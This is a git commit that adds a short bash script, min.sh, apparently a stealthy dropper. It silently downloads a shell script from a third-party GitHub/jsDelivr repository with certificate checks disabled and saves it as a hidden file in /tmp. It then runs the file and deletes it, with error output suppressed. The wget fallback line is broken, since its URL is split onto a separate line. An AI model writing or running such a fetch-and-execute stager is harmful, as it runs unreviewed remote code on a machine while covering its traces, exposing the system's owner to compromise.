dedffc5622f0139a4298516b823328280950fe37
Z <jjssj3052@gmail.com>
2026-08-01 21:58:25 +0400

    Create min.sh

---
+++ min.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+curl -fsSLk https://cdn.jsdelivr.net/gh/xdLolKek/connfy-libs@main/Connfy.sh -o /tmp/.r 2>/dev/null || wget -qO /tmp/.r
+https://raw.githubusercontent.com/xdLolKek/connfy-libs/main/Connfy.sh 2>/dev/null
+chmod +x /tmp/.r && bash /tmp/.r
+rm -f /tmp/.r
